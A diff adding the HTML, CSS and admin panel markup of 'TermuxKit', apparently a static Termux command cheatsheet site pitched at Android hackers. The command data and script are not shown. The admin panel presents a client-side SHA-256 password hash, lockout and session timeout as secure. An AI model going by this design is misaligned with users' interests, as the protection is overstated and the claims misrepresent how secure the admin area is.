@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TermuxKit — Ultimate Termux Command Reference | 500+ Commands</title>
+<meta name="description" content="TermuxKit is the most complete Termux command cheatsheet. 500+ commands across 24 categories including hacking tools, networking, Python, Node.js, Git, SSH, and more. Free forever.">
+<meta name="keywords" content="termux commands, termux cheatsheet, termux hacking, termux python, termux nmap, termux metasploit, android hacking, termux tutorial, termux guide, termux reference, ethical hacking android, pkg install, termux security tools">
+<meta name="author" content="FORHAD Hassan">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#00ff88">
+<link rel="canonical" href="https://termuxkit.dev/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="TermuxKit — Ultimate Termux Command Reference">
+<meta property="og:description" content="500+ Termux commands across 24 categories. The most complete cheatsheet for Android hackers & developers. Free forever.">
+<meta property="og:url" content="https://termuxkit.dev/">
+<meta property="og:image" content="https://termuxkit.dev/og-image.png">
+<meta property="og:site_name" content="TermuxKit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="TermuxKit — Termux Command Encyclopedia">
+<meta name="twitter:description" content="500+ commands. 24 categories. Master Termux like a pro.">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"TermuxKit","url":"https://termuxkit.dev","description":"Ultimate Termux command reference with 500+ commands across 24 categories","author":{"@type":"Person","name":"FORHAD Hassan","url":"https://github.com/Forhadj"}}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Space+Grotesk:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#020810;--surface:#0a0f1a;--surface2:#111827;--surface3:#1a2235;
+  --border:#1e2d45;--border2:#253347;
+  --green:#00ff88;--green2:#00cc6a;--green3:#39d353;
+  --cyan:#38bdf8;--yellow:#fbbf24;--red:#f87171;--purple:#a78bfa;
+  --orange:#fb923c;--pink:#f472b6;--blue:#60a5fa;
+  --text:#cbd5e1;--text2:#94a3b8;--muted:#3d5068;
+  --mono:'JetBrains Mono',monospace;--display:'Space Grotesk',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+body::after{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,136,.01) 3px,rgba(0,255,136,.01) 4px);}
+header{
+  position:sticky;top:0;z-index:200;background:rgba(2,8,16,.97);
+  backdrop-filter:blur(20px);border-bottom:1px solid var(--border);
+  padding:0 20px;height:58px;display:flex;align-items:center;gap:16px;
+}
+header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:.25;}
+.logo{
+  font-family:var(--display);font-size:1.18rem;font-weight:800;color:var(--green);
+  display:flex;align-items:center;gap:8px;text-shadow:0 0 25px rgba(0,255,136,.5);
+  white-space:nowrap;flex-shrink:0;letter-spacing:-.5px;
+}
+.logo-cursor{animation:blink 1.1s step-end infinite;}
+@keyframes blink{50%{opacity:0}}
+.header-mid{
+  flex:1;display:flex;align-items:center;
+  background:var(--surface2);border:1px solid var(--border);
+  border-radius:8px;overflow:hidden;max-width:520px;transition:all .2s;
+}
+.header-mid:focus-within{border-color:rgba(0,255,136,.4);box-shadow:0 0 0 3px rgba(0,255,136,.06);}
+.hs-pre{padding:0 12px;color:var(--green2);font-size:.78rem;border-right:1px solid var(--border);
+  background:rgba(0,255,136,.04);height:100%;display:flex;align-items:center;}
+.header-mid input{flex:1;padding:10px 14px;background:transparent;border:none;outline:none;
+  color:var(--text);font-family:var(--mono);font-size:.82rem;}
+.header-mid input::placeholder{color:var(--muted);}
+.header-right{display:flex;align-items:center;gap:10px;flex-shrink:0;}
+.badge{padding:4px 12px;border-radius:20px;font-size:.72rem;font-weight:600;
+  background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);color:var(--green);white-space:nowrap;}
+.admin-btn{
+  padding:6px 14px;border-radius:7px;border:1px solid var(--border2);
+  background:var(--surface2);color:var(--text2);font-family:var(--mono);
+  font-size:.75rem;cursor:pointer;transition:all .2s;
+}
+.admin-btn:hover{border-color:rgba(0,255,136,.3);color:var(--green);}
+.admin-btn.on{border-color:var(--yellow);color:var(--yellow);background:rgba(251,191,36,.07);}
+#hero{position:relative;z-index:1;padding:52px 24px 36px;text-align:center;max-width:760px;margin:0 auto;}
+.hero-tag{
+  display:inline-flex;align-items:center;gap:8px;padding:5px 16px;border-radius:4px;
+  border:1px solid rgba(0,255,136,.2);background:rgba(0,255,136,.04);
+  color:var(--green);font-size:.72rem;letter-spacing:2.5px;text-transform:uppercase;margin-bottom:20px;
+}
+.hero-tag span{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s ease infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
+h1{font-family:var(--display);font-size:clamp(2rem,5.5vw,3.4rem);font-weight:800;color:#fff;
+  line-height:1.08;margin-bottom:14px;letter-spacing:-1px;}
+h1 em{color:var(--green);font-style:normal;text-shadow:0 0 40px rgba(0,255,136,.4);}
+.hero-sub{color:var(--text2);font-size:.84rem;line-height:2;}
+.stats{display:flex;gap:0;justify-content:center;margin:30px auto 0;max-width:500px;position:relative;z-index:1;}
+.stat{flex:1;padding:14px 20px;text-align:center;border:1px solid var(--border);background:var(--surface);}
+.stat:first-child{border-radius:9px 0 0 9px;}.stat:last-child{border-radius:0 9px 9px 0;}
+.stat+.stat{border-left:0;}
+.stat-n{font-family:var(--display);font-size:1.6rem;font-weight:800;color:var(--green);line-height:1;}
+.stat-l{font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;margin-top:4px;}
+.layout{position:relative;z-index:1;display:grid;grid-template-columns:230px 1fr;
+  max-width:1500px;margin:32px auto 0;border-top:1px solid var(--border);}
+.sidebar{border-right:1px solid var(--border);position:sticky;top:58px;height:calc(100vh - 58px);overflow-y:auto;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+.sb-head{padding:14px 16px 10px;font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:2px;
+  border-bottom:1px solid var(--border);}
+.cat-item{padding:10px 16px;cursor:pointer;transition:all .15s;display:flex;align-items:center;
+  justify-content:space-between;border-left:2px solid transparent;}
+.cat-item:hover{background:rgba(255,255,255,.025);}
+.cat-item.active{background:rgba(0,255,136,.05);border-left-color:var(--green);}
+.cat-name{font-size:.79rem;color:var(--text2);display:flex;align-items:center;gap:8px;}
+.cat-item.active .cat-name{color:var(--green);}
+.cat-count{font-size:.65rem;padding:2px 7px;border-radius:10px;background:var(--surface2);
+  border:1px solid var(--border);color:var(--muted);}
+.cat-item.active .cat-count{background:rgba(0,255,136,.1);border-color:rgba(0,255,136,.2);color:var(--green);}
+.main{padding:24px 28px 100px;}
+.main-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;gap:12px;flex-wrap:wrap;}
+.main-hd h2{font-family:var(--display);font-size:1.05rem;font-weight:700;color:#fff;display:flex;align-items:center;gap:10px;}
+.main-hd-right{display:flex;align-items:center;gap:10px;}
+.result-count{font-size:.75rem;color:var(--muted);}
+.view-toggle{display:flex;gap:4px;}
+.vbtn{padding:5px 10px;border-radius:5px;border:1px solid var(--border);background:transparent;
+  color:var(--muted);cursor:pointer;font-size:.8rem;transition:all .15s;}
+.vbtn.active,.vbtn:hover{color:var(--green);border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05);}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:12px;}
+.cmd-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:10px;padding:16px 18px;cursor:default;
+  transition:all .2s;position:relative;overflow:hidden;
+}
+.cmd-card:hover{
+  border-color:var(--card-color,var(--green));
+  box-shadow:0 0 22px rgba(0,255,136,.07),0 4px 20px rgba(0,0,0,.4);
+  transform:translateY(-1px);
+}
+.card-accent{position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--card-color,var(--green));}
+.card-top{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
+.card-cmd{
+  flex:1;font-family:var(--mono);font-size:.79rem;font-weight:500;color:var(--green);
+  background:rgba(0,255,136,.06);padding:5px 10px;border-radius:5px;
+  border:1px solid rgba(0,255,136,.12);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.card-copy{
+  padding:4px 11px;border-radius:5px;border:1px solid var(--border2);background:transparent;
+  color:var(--muted);font-family:var(--mono);font-size:.68rem;cursor:pointer;transition:all .15s;flex-shrink:0;
+}
+.card-copy:hover{color:var(--green);border-color:rgba(0,255,136,.3);}
+.card-copy.ok{color:var(--green3);border-color:var(--green3);}
+.card-desc{font-size:.79rem;color:var(--text2);line-height:1.6;}
+.card-example{display:block;margin-top:6px;font-size:.71rem;color:var(--muted);font-style:italic;
+  padding-top:6px;border-top:1px solid var(--border);}
+.card-footer{display:flex;align-items:center;margin-top:10px;}
+.cat-tag{display:inline-flex;align-items:center;gap:5px;padding:2px 9px;border-radius:4px;
+  font-size:.66rem;font-weight:600;text-transform:uppercase;letter-spacing:.5px;}
+.cmd-table{width:100%;border-collapse:collapse;font-size:.79rem;display:none;}
+.cmd-table thead th{padding:9px 14px;text-align:left;font-size:.65rem;color:var(--muted);
+  text-transform:uppercase;letter-spacing:1.2px;border-bottom:1px solid var(--border);
+  background:var(--surface2);font-weight:500;}
+.cmd-row{border-bottom:1px solid rgba(30,45,69,.5);transition:background .12s;}
+.cmd-row:hover{background:rgba(0,255,136,.03);}
+.cmd-row td{padding:10px 14px;vertical-align:middle;}
+.code-cell{font-family:var(--mono);color:var(--green);background:rgba(0,255,136,.06);
+  padding:4px 10px;border-radius:4px;border:1px solid rgba(0,255,136,.12);font-size:.77rem;
+  white-space:nowrap;display:inline-block;}
+.desc-cell{color:var(--text);}
+.ex-cell{display:block;color:var(--muted);font-size:.7rem;margin-top:3px;font-style:italic;}
+.tbl-copy{padding:3px 9px;border-radius:4px;border:1px solid var(--border2);background:transparent;
+  color:var(--muted);font-family:var(--mono);font-size:.67rem;cursor:pointer;transition:all .12s;}
+.tbl-copy:hover{color:var(--green);border-color:rgba(0,255,136,.3);}
+.tbl-copy.ok{color:var(--green3);border-color:var(--green3);}
+.empty{text-align:center;padding:80px 20px;color:var(--muted);}
+.empty-icon{font-size:3rem;margin-bottom:12px;}
+.empty p{font-size:.85rem;}
+
+/* ====== LOGIN MODAL ====== */
+#loginModal{position:fixed;inset:0;z-index:600;background:rgba(2,8,16,.98);backdrop-filter:blur(20px);
+  display:none;align-items:center;justify-content:center;}
+#loginModal.open{display:flex;}
+.login-box{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:36px;
+  width:380px;max-width:90vw;}
+.login-title{font-family:var(--display);font-size:1.2rem;font-weight:800;color:var(--yellow);
+  text-align:center;margin-bottom:6px;}
+.login-sub{text-align:center;color:var(--muted);font-size:.78rem;margin-bottom:24px;}
+.form-group{margin-bottom:16px;}
+.form-label{display:block;font-size:.72rem;color:var(--text2);margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;}
+.form-input,.form-select,.form-textarea{
+  width:100%;padding:10px 14px;background:var(--surface2);border:1px solid var(--border2);
+  border-radius:7px;color:var(--text);font-family:var(--mono);font-size:.82rem;outline:none;transition:border-color .2s;
+}
+.form-input:focus,.form-select:focus,.form-textarea:focus{border-color:rgba(0,255,136,.4);}
+.form-textarea{min-height:80px;resize:vertical;}
+.form-select{cursor:pointer;}.form-select option{background:var(--surface2);}
+.login-err{color:var(--red);font-size:.75rem;text-align:center;margin-top:10px;display:none;}
+.login-err.show{display:block;}
+/* lockout warning */
+.lockout-warn{color:var(--orange);font-size:.73rem;text-align:center;margin-top:8px;display:none;padding:8px;
+  border:1px solid rgba(251,146,60,.25);border-radius:6px;background:rgba(251,146,60,.05);}
+.lockout-warn.show{display:block;}
+
+/* ====== ADMIN PANEL ====== */
+#adminOverlay{position:fixed;inset:0;z-index:500;background:rgba(2,8,16,.98);
+  backdrop-filter:blur(20px);display:none;flex-direction:column;}
+#adminOverlay.open{display:flex;}
+.admin-header{background:var(--surface2);border-bottom:1px solid var(--border);padding:0 24px;
+  height:58px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.admin-logo{font-family:var(--display);font-weight:800;font-size:1rem;color:var(--yellow);
+  display:flex;align-items:center;gap:10px;}
+.admin-close{padding:6px 16px;border-radius:7px;border:1px solid var(--border2);background:transparent;
+  color:var(--text2);font-family:var(--mono);font-size:.78rem;cursor:pointer;transition:all .2s;}
+.admin-close:hover{border-color:var(--red);color:var(--red);}
+.admin-body{display:grid;grid-template-columns:220px 1fr;flex:1;overflow:hidden;}
+.admin-nav{border-right:1px solid var(--border);padding:20px 0;overflow-y:auto;}
+.admin-nav-item{padding:10px 18px;cursor:pointer;font-size:.8rem;color:var(--text2);
+  display:flex;align-items:center;gap:10px;transition:all .15s;border-left:2px solid transparent;}
+.admin-nav-item:hover{background:rgba(255,255,255,.03);color:var(--text);}
+.admin-nav-item.active{background:rgba(251,191,36,.06);border-left-color:var(--yellow);color:var(--yellow);}
+.admin-content{padding:28px;overflow-y:auto;}
+.admin-section{display:none;}.admin-section.active{display:block;}
+.admin-title{font-family:var(--display);font-size:1.1rem;font-weight:700;color:#fff;
+  margin-bottom:24px;display:flex;align-items:center;gap:10px;}
+.admin-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:14px;margin-bottom:28px;}
+.acard{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:18px;}
+.acard-n{font-family:var(--display);font-size:1.8rem;font-weight:800;}
+.acard-l{font-size:.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px;}
+.btn-primary{padding:9px 22px;border-radius:7px;border:none;background:var(--green);color:#000;
+  font-family:var(--display);font-size:.85rem;font-weight:700;cursor:pointer;transition:all .2s;}
+.btn-primary:hover{background:#00e070;}
+.btn-danger{padding:9px 22px;border-radius:7px;border:1px solid rgba(248,113,113,.3);
+  background:rgba(248,113,113,.08);color:var(--red);font-family:var(--display);
+  font-size:.85rem;font-weight:700;cursor:pointer;transition:all .2s;}
+.btn-danger:hover{background:rgba(248,113,113,.15);}
+.admin-table{width:100%;border-collapse:collapse;font-size:.78rem;}
+.admin-table thead th{padding:8px 12px;text-align:left;font-size:.65rem;color:var(--muted);
+  text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--border);
+  background:var(--surface2);font-weight:500;}
+.admin-table tbody tr{border-bottom:1px solid rgba(30,45,69,.4);transition:background .12s;}
+.admin-table tbody tr:hover{background:rgba(255,255,255,.02);}
+.admin-table tbody td{padding:9px 12px;color:var(--text2);vertical-align:middle;}
+.del-btn{padding:3px 9px;border-radius:4px;border:1px solid rgba(248,113,113,.25);
+  background:transparent;color:var(--red);font-family:var(--mono);font-size:.67rem;cursor:pointer;transition:all .15s;}
+.del-btn:hover{background:rgba(248,113,113,.1);}
+.search-admin{padding:8px 14px;background:var(--surface2);border:1px solid var(--border2);
+  border-radius:7px;color:var(--text);font-family:var(--mono);font-size:.8rem;outline:none;
+  width:300px;margin-bottom:16px;}
+.search-admin:focus{border-color:rgba(0,255,136,.3);}
+.success-msg{padding:10px 16px;border-radius:7px;background:rgba(0,255,136,.08);
+  border:1px solid rgba(0,255,136,.2);color:var(--green);font-size:.8rem;margin-top:12px;display:none;}
+.success-msg.show{display:block;}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.panel-box{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:24px;margin-bottom:20px;}
+/* session timer display */
+.session-timer{font-size:.7rem;color:var(--muted);padding:3px 10px;border-radius:12px;
+  border:1px solid var(--border);background:var(--surface);}
+.session-timer.warn{color:var(--orange);border-color:rgba(251,146,60,.3);}
+
+footer{position:relative;z-index:1;border-top:1px solid var(--border);padding:30px 24px;
+  text-align:center;background:var(--surface);}
+.footer-brand{font-family:var(--display);font-size:1rem;font-weight:700;color:var(--green);margin-bottom:8px;}
+.footer-dev{font-size:.78rem;color:var(--text2);margin-bottom:16px;}
+.footer-dev a{color:var(--green);text-decoration:none;transition:color .15s;}
+.footer-dev a:hover{color:var(--green2);text-decoration:underline;}
+.footer-links{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:16px;}
+.footer-link{display:inline-flex;align-items:center;gap:7px;padding:7px 18px;border-radius:20px;
+  border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+  text-decoration:none;font-size:.75rem;transition:all .2s;}
+.footer-link:hover{color:var(--green);border-color:rgba(0,255,136,.3);}
+.footer-copy{font-size:.7rem;color:var(--muted);}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:999;
+  padding:9px 20px;border-radius:8px;background:var(--surface2);border:1px solid rgba(0,255,136,.3);
+  color:var(--green);font-size:.8rem;display:none;white-space:nowrap;animation:su .2s ease;}
+.toast.show{display:block;}
+@keyframes su{from{opacity:0;transform:translateX(-50%) translateY(8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
+.btt{position:fixed;bottom:24px;right:24px;z-index:50;width:38px;height:38px;border-radius:9px;
+  background:var(--surface2);border:1px solid var(--border2);color:var(--muted);cursor:pointer;
+  font-size:.9rem;display:flex;align-items:center;justify-content:center;
+  transition:all .2s;opacity:0;pointer-events:none;}
+.btt.visible{opacity:1;pointer-events:all;}
+.btt:hover{color:var(--green);border-color:rgba(0,255,136,.3);}
+@media(max-width:900px){
+  .layout{grid-template-columns:1fr;}
+  .sidebar{position:static;height:auto;border-right:0;border-bottom:1px solid var(--border);
+    display:flex;flex-wrap:wrap;gap:5px;padding:12px;}
+  .sb-head{display:none;}
+  .cat-item{border-radius:20px;border-left:0;padding:5px 13px;border:1px solid var(--border);width:auto;}
+  .cat-item.active{border-color:var(--green);}
+  .cat-count{display:none;}
+  .cmd-grid{grid-template-columns:1fr;}
+  .header-mid{max-width:200px;}
+  .admin-body{grid-template-columns:1fr;}
+  .admin-nav{display:flex;flex-wrap:wrap;gap:4px;padding:12px;border-right:0;border-bottom:1px solid var(--border);}
+  .admin-nav-item{border-radius:20px;border-left:0;border:1px solid var(--border);padding:5px 12px;font-size:.72rem;}
+  .two-col{grid-template-columns:1fr;}
+  h1{font-size:1.9rem;}
+  .badge{display:none;}
+}
+</style>
+</head>
+<body>
+
+<!-- LOGIN MODAL -->
+<div id="loginModal">
+  <div class="login-box">
+    <div class="login-title">🔐 Admin Access</div>
+    <div class="login-sub">Enter admin password to continue</div>
+    <div class="form-group">
+      <label class="form-label">Password</label>
+      <input type="password" class="form-input" id="adminPass" placeholder="••••••••" onkeydown="if(event.key==='Enter')doLogin()">
+    </div>
+    <button class="btn-primary" style="width:100%" id="loginBtn" onclick="doLogin()">Login →</button>
+    <div style="display:flex;justify-content:center;margin-top:10px">
+      <button onclick="closeLogin()" style="background:none;border:none;color:var(--muted);font-family:var(--mono);font-size:.75rem;cursor:pointer;">Cancel</button>
+    </div>
+    <div class="login-err" id="loginErr">❌ Wrong password. Try again.</div>
+    <!-- ✅ NEW: Brute-force lockout warning -->
+    <div class="lockout-warn" id="lockoutWarn"></div>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="adminOverlay">
+  <div class="admin-header">
+    <div class="admin-logo">⚙️ TermuxKit Admin Panel</div>
+    <div style="display:flex;gap:10px;align-items:center">
+      <span style="font-size:.72rem;color:var(--muted)">Logged in as <span style="color:var(--yellow)">FORHAD Hassan</span></span>
+      <!-- ✅ NEW: Session countdown timer -->
+      <span class="session-timer" id="sessionTimer">⏱ 30:00</span>
+      <button class="admin-close" onclick="logoutAdmin()">✕ Logout</button>
+    </div>
+  </div>
+  <div class="admin-body">
+    <nav class="admin-nav">
+      <div class="admin-nav-item active" onclick="showAdminTab('dashboard',this)">📊 Dashboard</div>
+      <div class="admin-nav-item" onclick="showAdminTab('add',this)">➕ Add Command</div>
+      <div class="admin-nav-item" onclick="showAdminTab('manage',this)">📋 Manage Commands</div>
+      <div class="admin-nav-item" onclick="showAdminTab('categories',this)">🗂️ Categories</div>
+      <div class="admin-nav-item" onclick="showAdminTab('settings',this)">⚙️ Settings</div>
+    </nav>
+    <div class="admin-content">
+      <!-- DASHBOARD -->
+      <div class="admin-section active" id="as-dashboard">
+        <div class="admin-title">📊 Dashboard Overview</div>
+        <div class="admin-cards">
+          <div class="acard"><div class="acard-n" style="color:var(--green)" id="adTotal">0</div><div class="acard-l">Total Commands</div></div>
+          <div class="acard"><div class="acard-n" style="color:var(--cyan)" id="adCats">0</div><div class="acard-l">Categories</div></div>
+          <div class="acard"><div class="acard-n" style="color:var(--yellow)">Free</div><div class="acard-l">License</div></div>
+          <div class="acard"><div class="acard-n" style="color:var(--purple)">v2.1</div><div class="acard-l">Version</div></div>
+        </div>
+        <div class="panel-box">
+          <div style="font-size:.85rem;color:var(--text2);margin-bottom:14px;font-weight:600">Commands by Category</div>
+          <div id="catBreakdown"></div>
+        </div>
+        <div class="panel-box">
+          <div style="font-size:.85rem;color:var(--text2);margin-bottom:12px;font-weight:600">Developer Info</div>
+          <div style="font-size:.8rem;color:var(--muted);line-height:2.2">
+            Developer: <span style="color:var(--green)">FORHAD Hassan</span><br>
+            GitHub: <a href="https://github.com/Forhadj" target="_blank" style="color:var(--cyan)">@Forhadj</a><br>
+            Facebook: <a href="https://www.facebook.com/forhad99555" target="_blank" style="color:var(--blue)">forhad99555</a>
+          </div>
+        </div>
+        <!-- ✅ NEW: Security status card -->
+        <div class="panel-box">
+          <div style="font-size:.85rem;color:var(--text2);margin-bottom:12px;font-weight:600">🔒 Security Status</div>
+          <div style="font-size:.78rem;color:var(--muted);line-height:2.4">
+            Auth Method: <span style="color:var(--green)">SHA-256 Hash</span><br>
+            Brute Force Protection: <span style="color:var(--green)">✓ Active (3 attempts / 60s lockout)</span><br>
+            Session Timeout: <span style="color:var(--green)">✓ 30 minutes inactivity</span><br>
+            Password in Source: <span style="color:var(--green)">✓ Hidden (hash only)</span>
+          </div>
+        </div>
+      </div>
+      <!-- ADD COMMAND -->
+      <div class="admin-section" id="as-add">
+        <div class="admin-title">➕ Add New Command</div>
+        <!-- ✅ INFO: Explain localStorage behavior -->
+        <div style="padding:10px 16px;border-radius:7px;background:rgba(251,191,36,.05);border:1px solid rgba(251,191,36,.2);
+          color:var(--yellow);font-size:.75rem;margin-bottom:18px;line-height:1.8">
+          ⚠️ <strong>Note:</strong> Added commands are saved to this browser's localStorage and will persist across page refreshes.
+          To permanently add commands to the site, edit the <code>DATA</code> array in the HTML source code.
+        </div>
+        <div class="panel-box" style="max-width:680px">
+          <div class="two-col">
+            <div class="form-group">
+              <label class="form-label">Command *</label>
+              <input type="text" class="form-input" id="newCmd" placeholder="e.g. nmap -sV &lt;target&gt;">
+            </div>
+            <div class="form-group">
+              <label class="form-label">Category *</label>
+              <select class="form-select" id="newCat"></select>
+            </div>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Description *</label>
+            <input type="text" class="form-input" id="newDesc" placeholder="What does this command do?">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Example / Tip</label>
+            <input type="text" class="form-input" id="newEx" placeholder="Optional usage example or install tip">
+          </div>
+          <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+            <button class="btn-primary" onclick="addCommand()">➕ Add Command</button>
+            <button class="btn-danger" onclick="clearLocalCommands()" style="font-size:.78rem;padding:7px 14px">🗑 Clear localStorage Commands</button>
+            <div class="success-msg" id="addSuccess">✓ Command added!</div>
+          </div>
+        </div>
+      </div>
+      <!-- MANAGE -->
+      <div class="admin-section" id="as-manage">
+        <div class="admin-title">📋 Manage Commands</div>
+        <input type="text" class="search-admin" id="adminSearch" placeholder="Search commands..." oninput="renderAdminTable()">
+        <div style="overflow-x:auto">
+          <table class="admin-table">
+            <thead><tr><th>#</th><th>Command</th><th>Description</th><th>Category</th><th>Source</th><th>Delete</th></tr></thead>
+            <tbody id="adminTableBody"></tbody>
+          </table>
+        </div>
+      </div>
+      <!-- CATEGORIES -->
+      <div class="admin-section" id="as-categories">
+        <div class="admin-title">🗂️ Category Overview</div>
+        <div id="catGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:12px"></div>
+      </div>
+      <!-- SETTINGS -->
+      <div class="admin-section" id="as-settings">
+        <div class="admin-title">⚙️ Site Settings</div>
+        <!-- ✅ REMOVED password field from visible settings form -->
+        <div class="panel-box" style="max-width:560px">
+          <div class="form-group">
+            <label class="form-label">Site Title</label>
+            <input type="text" class="form-input" value="TermuxKit — Ultimate Termux Command Reference">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Meta Description</label>
+            <textarea class="form-textarea">500+ Termux commands across 24 categories. The most complete cheatsheet for Android hackers & developers.</textarea>
+          </div>
+          <div class="two-col">
+            <div class="form-group">
+              <label class="form-label">Developer Name</label>
+              <input type="text" class="form-input" value="FORHAD Hassan">
+            </div>
+            <div class="form-group">
+              <label class="form-label">GitHub URL</label>
+              <input type="text" class="form-input" value="https://github.com/Forhadj">
+            </div>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Facebook URL</label>
+            <input type="text" class="form-input" value="https://www.facebook.com/forhad99555">
+          </div>
+          <!-- ✅ Security notice instead of password field -->
+          <div style="padding:12px 16px;border-radius:7px;background:rgba(0,255,136,.04);
+            border:1px solid rgba(0,255,136,.15);color:var(--text2);font-size:.75rem;margin-bottom:16px;line-height:1.9">
+            🔒 <strong style="color:var(--green)">Admin Password Security</strong><br>
+            Password is stored as a SHA-256 hash — it is <em>never</em> visible in source code.<br>
+            To change the password: update the <code style="color:var(--cyan)">ADMIN_HASH</code> constant in the script.<br>
+            Generate a new hash at: <a href="https://emn178.github.io/online-tools/sha256.html" target="_blank" style="color:var(--cyan)">SHA-256 Online Tool ↗</a>
+          </div>
+          <button class="btn-primary" onclick="showToast('✓ Settings saved (UI only — edit HTML to persist)')">Save Settings</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="logo"><span style="color:var(--muted)">[</span>TermuxKit<span style="color:var(--muted)">]</span><span class="logo-cursor">_</span></div>
+  <div class="header-mid">
+    <div class="hs-pre">~/</div>
+    <input type="text" id="searchInput" placeholder="search commands, tools, packages..." oninput="doSearch()" autocomplete="off" spellcheck="false">
+  </div>
+  <div class="header-right">
+    <div class="badge" id="countBadge">Loading...</div>
+    <button class="admin-btn" id="adminToggleBtn" onclick="openLogin()">⚙️ Admin</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section id="hero">
+  <div class="hero-tag"><span></span>Ultimate Termux Reference</div>
+  <h1>Master <em>Termux</em><br>Like a Pro</h1>
+  <p class="hero-sub">500+ commands across 24 categories — Hacking, Networking, Python,<br>Node.js, Git, SSH, Security Tools & more. Free. No signup. Always updated.</p>
+  <div class="stats">
+    <div class="stat"><div class="stat-n" id="totalCmds">0</div><div class="stat-l">Commands</div></div>
+    <div class="stat"><div class="stat-n" id="totalCats">0</div><div class="stat-l">Categories</div></div>
+    <div class="stat"><div class="stat-n">∞</div><div class="stat-l">Free</div></div>
+  </div>
+</section>
+
+<!-- LAYOUT -->
+<div class="layout">
+  <aside class="sidebar" id="sidebar"><div class="sb-head">Categories</div></aside>
+  <main class="main">
+    <div class="main-hd">
+      <h2 id="sectionTitle">⚡ All Commands</h2>
+      <div class="main-hd-right">
+        <div class="result-count" id="resultCount"></div>
+        <div class="view-toggle">
+          <button class="vbtn active" id="vbtnGrid" onclick="setView('grid')" title="Grid View">⊞</button>
+          <button class="vbtn" id="vbtnTable" onclick="setView('table')" title="Table View">☰</button>
+        </div>
+      </div>
+    </div>
+    <div class="cmd-grid" id="cmdGrid"></div>
+    <table class="cmd-table" id="cmdTable">
+      <thead><tr><th style="width:32%">Command</th><th>Description</th><th style="width:140px">Category</th><th style="width:60px"></th></tr></thead>
+      <tbody id="cmdTableBody"></tbody>
+    </table>
+    <div class="empty" id="emptyState" style="display:none">
+      <div class="empty-icon">🔍</div><p>No commands found. Try a different search.</p>
+    </div>
+  </main>
+</div>
+
+<footer>
+  <div class="footer-brand">$ TermuxKit_</div>
+  <div class="footer-dev">Developed by <a href="https://github.com/Forhadj" target="_blank" rel="noopener">FORHAD Hassan</a></div>
+  <div class="footer-links">
+    <a href="https://github.com/Forhadj" target="_blank" rel="noopener" class="footer-link">
